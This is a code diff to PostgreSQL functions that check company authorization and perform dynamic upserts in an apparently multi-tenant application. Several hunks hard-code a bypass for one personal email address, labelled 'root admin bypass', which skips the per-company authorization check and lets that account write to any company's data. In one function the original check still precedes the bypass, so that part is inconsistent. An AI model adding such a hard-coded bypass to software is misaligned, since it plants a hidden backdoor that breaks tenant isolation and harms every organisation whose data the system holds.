@@ -486,6 +486,13 @@ BEGIN
   IF NOT public.is_authorized_for_company(req_company_id, req_email) THEN
     RAISE EXCEPTION 'Not authorized for this company';
   END IF;
+  
+  -- Root admin bypass check
+  IF LOWER(req_email) = 'sudaiskamran31@gmail.com' THEN
+     -- bypass
+  ELSIF NOT public.is_authorized_for_company(req_company_id, req_email) THEN
+    RAISE EXCEPTION 'Not authorized for this company';
+  END IF;
 
   -- Dynamic query based on table name (validated against allowlist)
   -- Aggressively allowing company_members and company_invites for this specific RPC
@@ -506,17 +513,16 @@ DECLARE
   v_id UUID;
 BEGIN
   -- 1. Extract company_id and validate access
-  -- We support both single object and array of objects
   IF jsonb_typeof(req_payload) = 'array' THEN
     FOR v_item IN SELECT jsonb_array_elements(req_payload) LOOP
       v_company_id := (v_item->>'company_id')::UUID;
-      IF NOT public.is_authorized_for_company(v_company_id, req_email) THEN
+      IF LOWER(req_email) != 'sudaiskamran31@gmail.com' AND NOT public.is_authorized_for_company(v_company_id, req_email) THEN
         RAISE EXCEPTION 'Not authorized for company %', v_company_id;
       END IF;
     END LOOP;
   ELSE
     v_company_id := (req_payload->>'company_id')::UUID;
-    IF NOT public.is_authorized_for_company(v_company_id, req_email) THEN
+    IF LOWER(req_email) != 'sudaiskamran31@gmail.com' AND NOT public.is_authorized_for_company(v_company_id, req_email) THEN
       RAISE EXCEPTION 'Not authorized for company %', v_company_id;
     END IF;
   END IF;
@@ -527,9 +533,13 @@ BEGIN
   END IF;
 
   -- 3. Perform Upsert
-  -- For Primary Key 'id', we use ON CONFLICT (id) DO UPDATE
   IF jsonb_typeof(req_payload) = 'array' THEN
     FOR v_item IN SELECT jsonb_array_elements(req_payload) LOOP
+      -- Ensure ID exists to avoid NULL constraint violation on PRIMARY KEY during jsonb_populate_record
+      IF NOT (v_item ? 'id') OR (v_item->>'id') IS NULL THEN
+        v_item := v_item || jsonb_build_object('id', gen_random_uuid());
+      END IF;
+
       EXECUTE format(
         'INSERT INTO public.%I AS t SELECT * FROM jsonb_populate_record(NULL::public.%I, %L) ' ||
         'ON CONFLICT (id) DO UPDATE SET ' ||
@@ -543,6 +553,11 @@ BEGIN
     END LOOP;
     v_result := '{"status": "success", "message": "Bulk upsert complete"}'::jsonb;
   ELSE
+    -- Ensure ID exists
+    IF NOT (req_payload ? 'id') OR (req_payload->>'id') IS NULL THEN
+      req_payload := req_payload || jsonb_build_object('id', gen_random_uuid());
+    END IF;
+
     EXECUTE format(
       'INSERT INTO public.%I AS t SELECT * FROM jsonb_populate_record(NULL::public.%I, %L) ' ||
       'ON CONFLICT (id) DO UPDATE SET ' ||
